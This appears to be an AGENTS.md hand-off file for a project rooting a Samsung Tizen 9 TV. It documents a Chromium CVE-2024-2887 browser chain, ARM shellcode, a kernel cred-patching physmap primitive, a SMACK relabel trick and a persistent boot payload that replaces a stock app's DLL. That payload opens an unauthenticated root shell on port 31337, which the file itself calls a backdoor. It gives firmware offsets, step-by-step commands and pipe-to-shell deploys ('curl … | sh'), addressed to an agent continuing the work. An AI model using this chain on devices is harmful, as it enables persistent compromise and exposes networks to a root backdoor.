# AGENTS.md — hand-off for the next agent or human

You are continuing a **Samsung Tizen 9 TV root** project. Read this file first,
then `docs/EXPLOIT.md` (how it works), `docs/ROOT-METHODS.md` (what was found),
`docs/FAILED.md` (do not repeat these) and `docs/REMOTE.md` (remote/hotkey
remapping).x`

## 1. Current state (2026-10-22)

**STATUS 2026-10-22 20:40 — ROOTED, PERSISTENT, confirmed across an owner-initiated
TV restart (43 s from first beacon to `31337`, `uid=0`, no PC involvement).**

The payload's boot sequence needs one fast-exit + AUL relaunch by design: beacons
showed `attempt=1` → `fast-exit attempt=1` → `start pid=<new>` → `attempt=2` →
`self-patch uid=0` → `ROOTCHAN 31337 uid=0`.

Portability (other Tizen 9 TVs): **the method travels, this build does not.**
`payload.dll` hardcodes `PHYS_OFFSET`, `init_task` and four `task_struct` offsets;
the browser chain is CVE-2024-2887 and therefore Chromium-120-specific. Gate order
and what to re-measure: `docs/PORTABILITY.md`; safe first step on a foreign unit is
`server/probe.html` (runs nothing, logs UA + WasmGC support).

**How it was restored (the important correction):** the SMACK problem was solved in
**userspace**, not kernel memory. From a root shell (op 5) with the patched cred:

```sh
echo -n "User::Pkg::com.samsung.tv.MultiControl-Service" > /proc/self/attr/current
curl -s http://<pc>/deploy.sh | sh
aulctl stop com.samsung.tv.MultiControl-Service; aulctl start com.samsung.tv.MultiControl-Service
```

`/proc/self/attr/current` **accepts the write** for a root+full-caps task (measured
twice today; the earlier "denied by smack_onlycap" note came from a shell without
those caps — always retest that). Once the shell carries the app's label it can
write the app's `bin/` (the dir is `User::Home` transmute=TRUE, so the new file
inherits the app label). `deploy.sh` then reports `COPY=ok`, `DLL_LABEL=...::RO`,
`AOT=disabled`, `BOOT_ROW=ok`. AUL needs an explicit **stop+start** — `reload`
alone does not restart a running app, which is why the first attempt left the old
DLL loaded.

**Two traps that cost hours:** the app process `comm` is **`DN_trol-Service`**
(its exe is `/usr/bin/dotnet-launcher-inhouse`), *not* `MultiControl*` — every
physical scan for "MultiControl" was doomed. And the app is invisible in the
browser shell's PID namespace, so `/proc` looks empty while `aulctl status` shows
it running; use `aulctl status <appid>` for its pid.

Verified end-to-end 18:51: `reboot` → 31337 listening **41 s** later → `uid=0`,
`uptime` 1 min, `/opt/usr/system/dsh_root_proof.txt` rewritten by that boot.

The day's history: permanent root was achieved and verified twice
(`docs/BOOT-REGRESSION-SMACK-2026-10-22.md`), **deliberately removed by the
verified uninstall test** to prove the undo path, and then **restored and
re-verified on a cold boot (18:51, 41 s)**. The restore did not need the
kernel-memory relabel at all — see the two traps above: a root shell can take the
app's label via `/proc/self/attr/current`, and the payload is then written by
`deploy.sh` as the app's own file.

Superseded claim: "re-installing is not possible from the browser lane" (17:12)
was true *only* while we did not know the userspace relabel works. It does.

Fallback (still valid, still maintained): `python tools/tv_rootwatch.py` with the
TV browser on `http://<pc>/index.html` roots the stub and hands back a **root
shell on 127.0.0.1:9999** — use it if the payload is ever missing again, then run
`server/recover.sh` from that shell.
**VALIDATED 21:13 — the one-click path works from a stock TV.** Full cycle run
end to end: `uninstall.ps1` (stock IL/AOT restored and relabelled, boot row
verified at 0) → reboot, `31337` stayed closed → `root.ps1` → `RELABEL=ok`,
`COPY=ok`, `DLL_LABEL=…::RO`, `AOT=disabled`, `BOOT_ROW_COUNT=1`, `DEPLOY_DONE`
→ reboot → **31337 at 47 s, `uid=0`, no page, no PC**. Four fixes were needed
along the way: the relabel prelude in the generated deploy script, the `RSET`
race (client resent it while waiting; server evicted waiting clients), the
detached `aulctl stop`+`start` (stop blocks while the payload runs), and SQL
readback verification in deploy/uninstall.

**Automation history (20:55, before the fix):** `root.ps1` could not root a stock TV as shipped —
it generated `deploy_local.sh` from `deploy.sh` and ran it from the browser-labelled
stub, whose SMACK label cannot write the app's `bin/` (`COPY=fail`, the 17:12
finding). Fixed: the generated script now begins with a relabel prelude, which works
because `auto_root.py` patches the stub's cred to uid 0 first, so the forked shell
is root. Generation is verified (LF-only, `sh -n` clean); the full unattended run
has not been exercised on a stock TV since the fix — if it ever fails there, the
symptom will be `RELABEL=fail` followed by `COPY=fail`.

Operational note (cost an afternoon today): the server must not run as a console
app under a job or Task Scheduler — it is silently terminated when that console or
job goes away, which makes the TV page go blank. It now runs as task
`TV-LabServer` via `wscript`; full recipe in `docs/SERVER-HOSTING.md`.

- The TV self-roots during boot via the replaced IL of the stock on-boot app
  `com.samsung.tv.MultiControl-Service`.
- Root channel: **TCP 31337**, line protocol, reply ends with `__END__`.
- Payload: **v9**, 19,456 B, md5 `ffdb936f5263a04a26b4727ee8307151`
  (`server/payload.dll`, source in `payload/`).
  v7 = v6 + 31337 peer allowlist (`rootchan.allow`) + 120 s `/dev/video40` open
  retry. **v8** = direct `real_parent` patch (offsets `0x2F0`/`0x2F4`, needs no
  comm read) + spaced in-process retries. **v9** = fast-exit retry loop: after a
  short attempt the app exits on purpose so AUL relaunches it (~1–4 s), because a
  *fresh process* reads coherent task memory; 4 fast attempts (counter in
  `/tmp/.dsh_try`) then a long fallback mode. Measured cold boot → root: **38 s**.
- v6 fixed the warm-restart failure: snapshot existing `PHYRFORK` tasks before
  forking, scan up to 20 s for a *new* one, validate the cred uid before
  patching, keep the landmark alive for 120 s (tested 2×: 11 s / 8 s).
- Verified: two cold boots, a deliberate `kill -9`, and two v6 warm restarts.
- **Re-verified 2026-10-22 15:55** after the SMACK-label fix: cold boot →
  `start uid=5001` → `self-patch uid=0` → `ROOTCHAN 31337 uid=0`; `chan.py "id"`
  returns `uid=0` under the app's label; kill → AUL restart → re-rooted.
  Full write-up: `docs/BOOT-REGRESSION-SMACK-2026-10-22.md`.
- The previous payloads (v2 13 KB, v4 16,896 B `B6886C60…`) are broken: they
  patched a forked child's cred (a **copy**) and rejected LPAE pointers above
  `0xE0000000`.

## 2. Target facts

| Item | Value |
|---|---|
| Model / platform | QNX1D series, 2024 Neo QLED (QTV T09 platform) |
| OS | Tizen 9 |
| Kernel | Linux 5.4.249, ARM32 LPAE, `PHYS_OFFSET 0x20000000` |
| Browser | Chromium 120.0.6099.5 (WasmGC available) |
| Kernel Image | phys `0x20008000`, signature `ee4400eb00900fe1` |
| `init_task` | `0xC0957180` (phys `0x20957180`) |
| Task list offset | `0x23C` (`prev` links; `next` unusable) |
| cred / real_cred / comm | task+`0x3F8` / `0x3F4` / `0x400` |
| Full caps | `0x0000003fffffffff` |
| Root channel | TCP `31337` |

These constants are specific to this firmware build. Before using the toolkit on
another model or firmware, re-measure the Image base, `init_task`, the task-list
offset and the cred offsets, and verify the physmap still works (see
`README.md` → Compatibility).

## 3. Architecture

```
TV browser (uid 5001, gid 44 video)
  └─ index.html ──CVE-2024-2887──▶ renderer R/W + ARM shellcode
        └─ physmap stub: opens /dev/video40, serves RPC over TCP/80
              ▲
PC            │ server/server.py (port 80: page + RPC gateway on 127.0.0.1:9998)
              │ tools/auto_root.py / kernel_root.py / physmap.py / root_shell.py
              ▼
TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
  └─ MultiControlService.dll (payload) ─▶ physmap ─▶ cred patch ─▶ TCP 31337
```

## 4. Required tools

- **PC on the same LAN.** The TV must reach the PC's TCP/80; the PC must reach
  the TV's TCP/31337.
- **Python 3** for the server and clients.
  - On Windows the base `python.exe` path was blocked by a firewall rule; the
    server was run under a renamed copy (`pysrv.exe`). Any interpreter the
    firewall permits works; `root.ps1` auto-detects one.
- **.NET SDK 6+** only to rebuild the boot payload.
- **keystone + capstone** (Python) only to rebuild `tools/physrpc.S` into
  shellcode.
- No sdb, no Tizen Studio, no firmware images, no flashing.

## 5. Files

`root.ps1` is the one-command entry point; it expects this layout:

| File | Purpose |
|---|---|
| `server/server.py` | port-80 HTTP server + RPC gateway + shell bridge |
| `server/index.html` | page that loads the browser chain |
| `server/payloads/browser_payload.js` | browser V8 payload (hdbreaker chain + physrpc) |
| `server/lib/wasm_builder.js` | WasmGC helper used by the payload |
| `server/deploy.sh` | deploy script executed on the TV as root (verifies md5) |
| `server/uninstall.sh` | restores the stock app (run via the channel) |
| `server/payload.dll` | the root-on-boot payload served to the TV |
| `tools/physmap.py` | RPC client (hello, read/write, ops) |
| `tools/kernel_root.py` | finds the kernel/`init_task`/task and patches the cred |
| `tools/auto_root.py` | waits for a stub, roots it, runs the deploy script |
| `tools/root_shell.py` | root-channel client (TCP 31337) |
| `tools/run_root.py` | run a shell command as root via op 7 (manual) |
| `tools/write_root.py` | write a file as root via op 8 (manual) |
| `tools/physrpc.S` | ARM32 RPC stub source |
| `tools/build_physrpc.py` | assembles the stub (keystone/capstone) |
| `tools/taskwalk.py` | task-list chain diagnostic (`next`/`prev`) |
| `payload/Program.cs` | boot payload source (v7) |
| `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
| `root.ps1` | one-command runner (server + root + deploy + verify) |
| `uninstall.ps1` | one-command uninstall (restore stock + verify) |
| `server/logs/` | **all runtime output** (created on demand, git-ignored) |

### Logs

Everything the toolkit writes at runtime goes under `server/logs/`, so the
toolkit directory itself stays clean:

| Path | What |
|---|---|
| `logs/server.out`, `logs/server.err` | stdout/stderr of the server, redirected there by `root.ps1` / `uninstall.ps1` |
| `logs/shell.log`, `logs/shell.log.1` | rolling capture of the TV shell/console (8 MB rotation) |
| `logs/beacons.log` | one timestamped line per `DSHROOT …` beacon from the payload — **the fastest way to see whether the app started at all** |
| `logs/tv/tv_output_*.txt` | dumps the exploit page POSTs to `/save` (kept to the newest 100; override with `TV_OUTPUT_KEEP`) |

`/logs/**` is refused by the HTTP server (404), so the directory is never served
to the LAN even though it sits inside the docroot. If you run `server.py`
yourself, it creates `logs/` next to itself; only the two redirect files are the
launcher's responsibility.

### Root without the app payload (host watchdog)

If the payload is not installed (or the TV was just uninstalled), root is
available through the browser lane plus a watchdog:

```
# after each boot, with the TV browser on http://<pc>/index.html
python tools/tv_rootwatch.py          # root the stub, then op5 -> shell on :9999
```

`tools/tv_rootwatch.py` starts `server/server.py` with `pysrv.exe` if port 80 is
down, attaches to the RPC gateway, and roots the stub - tail walk for the
`PHYSRPC1` comm first, otherwise a content scan for owner creds
(`ids = 5001,100 x4` at `cred+4`, bounded to phys `0x20000000-0x40000000` because
reads past `0x46000000` hang the stub). With the shell step it then sends op 5, so
**`127.0.0.1:9999` becomes an interactive root shell** (`id -u` -> `0`); it dies
when the page reloads, so re-run the watchdog after a reload.

Note: once the browser process's cred has been patched in a boot, new renderers
inherit it, so later stubs come up already root and the watchdog reports
`root: already`. A reboot clears that - the watchdog then does the real work.

The only manual step is the page load. Set the TV browser's start page to the
URL once and re-running the watchdog is all that is needed after a boot.

### Wedged stubs: `RSET` instead of a server restart

A stub can stop answering without the TCP socket closing - typically after an
`op 5` (EXEC) or `op 7` (RUN) consumed it, or after a TV power cycle that left a
half-open socket. The gateway used to keep such a socket as its current pairing
forever, so every later client got a cached hello and nothing else, and the only
cure was restarting the server.

Now the gateway accepts a 4-byte **`RSET`** sentinel instead of a tunnel client:
it closes the paired TV socket and replies `OK` (or `IDLE` if nothing was
paired). Use it from Python:

```python
import physmap; print(physmap.reset_stub())   # "OK" / "IDLE" / "no-gateway(...)"
```

The next page load then pairs cleanly. `recon/op7_wait.py` calls it
automatically when no live stub answers. Treat a stub as single-use for `op 7`
and never send FILE (op 8) bytes to a stub that has already been turned into a
shell - that corrupts the stream and wastes the page load.

### Repository hygiene (`.gitignore`, `.gitattributes`)

**Committed** (36 files, ~380 KB on a fresh clone): `docs/`, `payload/*.cs` +
`*.csproj`, `server/{server.py,index.html,payload.dll,deploy.sh,uninstall.sh,diag.sh}`,
`server/lib/`, `server/payloads/`, `tools/*.py|*.S|*.txt`, `root.ps1`,
`uninstall.ps1`, `AGENTS.md`, `README.md`, `NOTICE.md`.

**Ignored**: `server/logs/` (runtime), `payload/obj/` + `payload/out/` +
`payload/bin/` (rebuildable: `cd payload && dotnet build -c Release`),
`tools/__pycache__/`, `server/deploy_local.sh` (per-host, contains the PC IP),
`.root_probe`, plus the usual editor/OS/scratch/secret patterns and
`*.tpk`/`*.wgt`.

`server/payload.dll` is committed **deliberately** — it is the artifact the TV
fetches during deploy, and it is byte-identical to
`payload/out/MultiControlService.dll` (md5 `ffdb936f…`), so the repo runs
without a .NET SDK.

`.gitattributes` pins `*.sh`/`*.py` to **LF**: the TV's busybox `sh` treats a CR
as part of the token (`#!/bin/sh^M: not found`), so a Windows checkout must not
rewrite them. `*.ps1` is CRLF; DLLs and other binaries are marked `binary`.

Not needed at runtime: `payload/` source, docs, `.NET SDK`.

## 6. Reproduce the root from scratch

**Fast path:** `pwsh -File root.ps1 -TvIp <tv-ip>` does steps 0–4 and 6 below
(use `-DryRun` first). It needs `tools/` + `server/` beside it, or
`-ToolkitDir`; it reuses a server already serving `index.html`, and
`-RestartServer` replaces a different server on port 80. The manual steps that
remain are on the TV remote: load the page, then reboot.

Placeholders: `<HOST_IP>` = PC, `<TV_IP>` = TV.

```sh
# 0. on the PC
cd server
python server.py                        # or: pysrv.exe server.py

# 1. on the TV browser open
#    http://<HOST_IP>/index.html
#    wait for HARNESS_UP / WASM_LOADED / PAYLOAD_LOADED / RUNNING
#    do not open another tab; do not reload after RUNNING

# 2. root the renderer (fresh stub!)
cd ../tools
python kernel_root.py --fork
#    accept ONLY: ids = (5001, 100, 5001, 100, ...) then
#                 uid=0 cap_permitted=0x3fffffffff
#    if ids = (0,0,...) -> the cred was already patched (root) or bogus;
#    if it says "skip ... (not a cred)" -> reload the page and retry

# 3. verify
python run_root.py "id" 6               # uid=0(root)

# 4. deploy the boot payload
python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
#    expect: UID=0, SIZE=17920, MD5=d247e67a..., COPY=ok, DEPLOY_DONE

# 5. reboot the TV (exit the browser first so it does not restore the page)

# 6. permanent root
python root_shell.py "id"               # uid=0(root)
python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'"
```

`tools/auto_root.py` automates steps 2 and 4: start it, then load the page once.

## 7. Verification checklist

- [ ] `root_shell.py "id"` returns `uid=0(root)`.
- [ ] `root_shell.py "cat /proc/self/status | grep CapEff"` → `0000003fffffffff`.
- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll"` → `d247e67a…`.
- [ ] Cold boot with the browser closed → channel is back within ~60–90 s.
- [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.

## 8. Traps (each cost hours — read `docs/FAILED.md`)

1. **Stub lifetime is minutes.** The renderer is killed by the browser
   watchdog while blocked in the shellcode. Deploy in one batch.
2. **Reloading the page kills the stub.** Each load = a new stub; root it and
   deploy without reloading.
3. **One `/dev/video40` RDWR opener.** If the boot payload holds it, the
   browser cannot; the payload must close it after rooting.
4. **`fork()` copies the cred.** Patch the parent found via `real_parent`, not
   the child.
5. **Kernel pointers can be above `0xE0000000`** (LPAE 1 GB direct map). Never
   bound kernel pointers at `0xE0000000`.
6. **Post-fork managed code.** Use a pre-pinned buffer + raw
   `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
7. **Short commands.** Op 7 commands over ~100 chars can kill the stub; use
   `curl …/deploy.sh | sh`.
8. **Do not fork repeatedly on one stub**; zombies poison the task walk.
9. **Do not touch `/mnt/systemrw`** (OTA/update data) and do not poke
   `/dev/tztv_tcon` (TCON flash = brick risk).
10. **Keep TV auto-update off.** An OTA replaces the app and the boot row.
11. **The browser payload's callback IP is baked into the shellcode.** If the PC
    IP changes, rebuild `tools/physrpc.S` (`build_physrpc.py`) and re-embed the
    shellcode in `server/payloads/browser_payload.js`; `root.ps1` only rewrites
    the deploy script.

## 9. Rebuilding the payload

```sh
cd payload
dotnet build -c Release -o out
# new file: out/MultiControlService.dll
```

Then deploy it with the browser root channel (`write_root.py` or a `deploy.sh`
that downloads it) and reboot. Things to preserve when editing `Program.cs`:

- `Kptr(v) => v >= 0xC0000000` (accept the full 32-bit direct map).
- Child tag via `GCHandle`-pinned bytes + `syscall(172, 15, ptr, 0,0,0,0)`.
- `Thread.Sleep(600)` in the parent after `fork()`.
- Patch the **parent** task's cred (`real_parent`), not the child's.
- Close `_fd` after rooting, before `RootChannel()`.
- Keep the channel line protocol and the `__END__` terminator.

## 10. Recovery

- **Payload fails to root at boot, channel down:** the browser path still
  works. Reload `index.html`, `kernel_root.py --fork`, redeploy. If
  `/dev/video40` is held by the failed payload, wait ~2 min (it exits) or
  reboot.
- **Restore stock app / uninstall:** run `pwsh -File uninstall.ps1 -TvIp <tv-ip>`
  (uses the 31337 channel, runs `server/uninstall.sh`, md5-checks the backups,
  restores IL + AOT, removes the boot row unless `-KeepBoot`, reboots and
  verifies 31337 stays closed). Manual fallback if the channel is down: load
  `index.html`, `kernel_root.py --fork`, then
  `run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh"`.
- **Backups on the TV:** `mcs_orig.dll` (original IL),
  `mcs_ni_orig.dll` (original AOT), `bin/.native_image.disabled.<epoch>`,
  `payload_backup.dll` (our payload).
- **Browser stub rebuild:** `tools/physrpc.S` + `tools/build_physrpc.py`; the
  shellcode must then be re-embedded in `browser_payload.js` (manual step).

## 11. Open work

- Bind 31337 to a single address instead of `0.0.0.0`. Partly mitigated in v7:
  the payload checks the peer IP against `rootchan.allow` (one address, written
  by `deploy.sh`), so only that host is served — but the socket still listens on
  all interfaces.
- ~~Retry `open("/dev/video40")` instead of sleeping 120 s~~ — **done in v7**
  (120 s retry), so a browser stub holding the device no longer costs a cycle.
- ~~Replace the task-list walk with a list-independent locator~~ — **done
  2026-10-22**: `tools/scan_cred.py` finds creds by content
  (`ids = 5001,100 ×4` at `cred+4`, refcount-checked) and patches them; 253
  creds were rooted in one pass with no task list at all. The walk is still used
  when it happens to work (fresh stub), and the pid-hash/IDR routes remain
  blocked for the reasons recorded below.
  **pid-hash/IDR are both blocked (measured 2026-10-22):** the shipped `uImage`
  has no kallsyms (`vmlinux-to-elf` → `0 candidates for kallsyms_token_table`),
  `/proc/kallsyms` does not exist, and the GPL build is a different kernel whose
  System.map omits static `pid_hash`/`pidhash_shift` (`init_task` `0xC08F72C0`
  vs running `0xC0957180`). `init_pid_ns` **was** found via `__ksymtab`
  (`0xC095CC70`, level 0), but it has no `idr` field — the struct ends after
  `proc_work`/`pid_allocated`, i.e. `CONFIG_CHECKPOINT_RESTORE` is off, so the
  IDR route is dead. The comm-scan fallback was then tried and is unreliable:
  reading past phys `0x46000000` hung the stub twice (once followed by a
  reboot), and freshly allocated task_structs often read back as `0xff`, so a
  comm hit does not validate. That is why the cred-content scan above (bounded
  to `0x40000000`) is the supported route. Probe kept at `tools/find_pidns.py`.
  See `docs/SCRIPT-REVIEW.md`.
- Automate re-embedding the shellcode in `browser_payload.js` after a rebuild.
- Repoint the remote's app buttons by patching `com.samsung.tv.hotkey-service`
  (see `docs/REMOTE.md`): capture the `XF86AppN` key, decompile the service IL,
  change the appid, deploy with a backup, test one button.
- Add a `next.dll` self-update flow test (the code path exists but is unused).
- Re-measure offsets on other Tizen 9 models; the physmap primitive may be
  shared even where the constants differ.
- Measure OTA behaviour (does an update replace the app/boot row?).

## 12. Safety rules

- Only on hardware you own. A bad physical write can brick the TV.
- One change at a time; verify with `root_shell.py` after each.
- Never overwrite unknown system files; keep the backups.
- The root channel is unauthenticated: treat it as a LAN-wide root backdoor.

* **Recovery:** `server/recover.sh` — paste it into a root shell on the TV
  (`curl -s http://<pc>/recover.sh | sh`) to reinstall the payload end-to-end: it
  takes the app's SMACK label via `/proc/self/attr/current`, runs `deploy.sh`, and
  `deploy.sh` restarts the app so the new DLL loads. Verified 2026-10-22 18:51 on
  a cold boot (31337 in 41 s, no PC involvement).